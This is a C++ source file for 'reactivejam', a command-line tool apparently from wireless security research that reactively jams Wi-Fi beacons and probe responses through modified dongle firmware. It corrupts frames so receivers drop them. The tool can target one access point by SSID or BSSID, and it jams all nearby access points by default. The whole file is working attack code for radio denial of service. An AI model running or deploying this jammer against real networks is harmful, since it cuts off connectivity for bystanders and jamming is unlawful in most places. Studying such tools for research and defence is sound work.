#include <stdarg.h>
#include <getopt.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdexcept>
#include <iostream>

#include "osal_wi.h"
#include "util.h"
#include "ieee80211header.h"
#include "MacAddr.h"

struct options_t {
	char interface[128];

	MacAddr bssid;
	char ssid[128];
	int seconds;
	int jam_packet_length;
	int jam_delay_us;
	int jam_rate_index;
	int match_on_position;
	uint8_t match_packet_type;

	int config_phy;
} opt;

struct global_t {
	bool exit;
} global;

char usage[] =

"\n"
"  reactivejam - Mathy Vanhoef\n"
"\n"
"  usage: reactivejam <options>\n"
"\n"
"     Reactively jam beacons and probe responses. The end of the packets will be corrupted.\n"
"     Hence the CRC of these packets is invalid, and they will be dropped by the reciever.\n"
"     By modifying the firmware any type of medium/large packets can be targetted!\n"
"\n"
"     To detect corrupted frames in monitor mode: iw wlanX set monitor fcsfail\n"
"\n"
"  Attack options:\n"
"\n"
"      -i interface : Wireless interface to use as the jammer (must be in monitor mode)\n"
"      -s ssid      : SSID of the Access Point (AP) to jam. If not specified, all\n"
"                     access points will be jammed.\n"
"\n"
"  Optional parameters:\n"
"\n"
//"      -p rateid    : Transmission rate ID for the jamming packet\n"
"      -b bssid     : MAC address of AP to jam (instead of SSID, e.g. to jam hidden network)\n"
"      -t sec       : Jam interval duration in seconds. Jamming can only be stopped\n"
"                     between intervals since the dongle CPU is busy when jamming.\n"
"                     The downside is that _between_ intervals some frames will be\n"
"                     missed and hence won't be jammed.\n"
"      -l bytes      : jam packet length in Bytes\n"
"      -d us         : jam delay in microseconds\n"
"      -r index      : rate index for jam packet\n"
"      -m pos        : match on position\n"
"      -n 0xFF       : match Byte\n"
"\n";

void printUsage()
{
	printf("%s", usage);
}

bool parseConsoleArgs(int argc, char *argv[])
{
	int option_index = 0;
	int c;

	static struct option long_options[] = {
		{"help",      0, 0, 'h'}
	};

	if (argc <= 1) {
		printUsage();
		return false;
	}

	// default settings
	memset(&opt, 0, sizeof(opt));
	opt.seconds = 30;
	opt.jam_packet_length = 24;
	opt.jam_delay_us = 0;
	opt.jam_rate_index = 0;
	opt.match_on_position = 0;
	opt.match_packet_type = 0x80;

	while ((c = getopt_long(argc, argv, "h:i:s:b:p:t:l:d:r:m:n:", long_options, &option_index)) != -1)
	{
		switch (c)
		{
		case 'h':
			printUsage();
			// when help is requested, don't do anything other then displaying the message
			return false;

		case 'i':
			strncpy(opt.interface, optarg, sizeof(opt.interface));
			break;

		case 's':
			strncpy(opt.ssid, optarg, sizeof(opt.ssid));
			break;

		case 'b':
			try {
				opt.bssid = MacAddr::parse(optarg);
			} catch (const std::invalid_argument &ex) {
				std::cout << ex.what() << std::endl;
				return false;
			}
			break;

		case 'p':
			printf("Rate selection of the jamming packet is not yet implemented.\n");
			opt.config_phy = atoi(optarg);
			break;

		case 't':
			opt.seconds = atoi(optarg);
			break;

		case 'l':
			opt.jam_packet_length = atoi(optarg);
			break;

		case 'd':
			opt.jam_delay_us = atoi(optarg);
			break;

		case 'r':
			opt.jam_rate_index = atoi(optarg);
			break;

		case 'm':
			opt.match_on_position = atoi(optarg);
			break;

		case 'n':
			//char bufff[2];
			//strncpy(bufff, optarg, 2);
			opt.match_packet_type = strtol(optarg, NULL, 16);
			break;

		default:
			printf("Unknown command line option '%c'\n", c);
			return false;
		}
	}

	if (opt.interface[0] == '\x0')
	{
		printf("You must specify an interface to just for jamming (-i).\n");
		printf("\"reactivejam --help\" for help.\n");
		return false;
	}

	// Set a broadcast MAC address to instruct firmware to jam all APs
	if (opt.bssid.empty() && opt.ssid[0] == '\x0')
		opt.bssid = MacAddr::parse("01:00:00:00:00:00");

	return true;
}


int find_ap(wi_dev *dev)
{
	uint8_t buf[2048];
	ieee80211header *beaconhdr = (ieee80211header*)buf;
	size_t len;
	int chan;

	len = get_beacon(dev, buf, sizeof(buf), opt.ssid, opt.bssid);
	if (len <= 0) {
		printf("Failed to capture beacon of target AP\n");
		return -1;
	}

	// Update options based on captured info
	opt.bssid = MacAddr(beaconhdr->addr2);
	beacon_get_ssid(buf, len, opt.ssid, sizeof(opt.ssid));

	// Check channel of network
	chan = beacon_get_chan(buf, len);
	if (chan == -1) {
		fprintf(stderr, "Failed to read channel from beacon\n");
		return -1;
	}
	if (chan != osal_wi_getchannel(dev)) {
		printf("Changing channel of %s to %d\n", dev->name, chan);
		osal_wi_setchannel(dev, chan);
	}
	

	return 1;
}


int reactivejam(wi_dev *jam)
{
	if (opt.bssid.multicast())
	{
		std::cout << "Jamming all APs nearby (beacons and probe responses)\n";
	}
	else
	{
		if (find_ap(jam) < 0) {
			fprintf(stderr, "Unable to find target AP\n");
			return -1;
		}
		std::cout << "Jamming " << opt.bssid << " SSID " << opt.ssid << "\n";
	}
	std::cout << "\n  >> Press CTRL+C to exit << \n\n";

	while (!global.exit)
	{
		fprintf(stderr, "=========== JAMMING =============\n");

		if (osal_wi_jam_beacons(jam, opt.bssid, opt.seconds * 1000, opt.jam_packet_length, opt.jam_delay_us, opt.jam_rate_index, opt.match_on_position, opt.match_packet_type) < 0)
		{
			fprintf(stderr, "Something went wrong when issuing the jam command\n");
			exit(1);
		}
	}

	return 1;
}

void handler_sigint(int signum)
{
	global.exit = true;

	fprintf(stderr, "\nStopping jamming, please wait ...\n");
}

int main(int argc, char *argv[])
{
	wi_dev jam;

	if (!parseConsoleArgs(argc, argv))
		return 2;

	signal(SIGINT, handler_sigint);
	if (osal_wi_open(opt.interface, &jam) < 0) return 1;

	reactivejam(&jam);

	osal_wi_close(&jam);
	return 0;
}


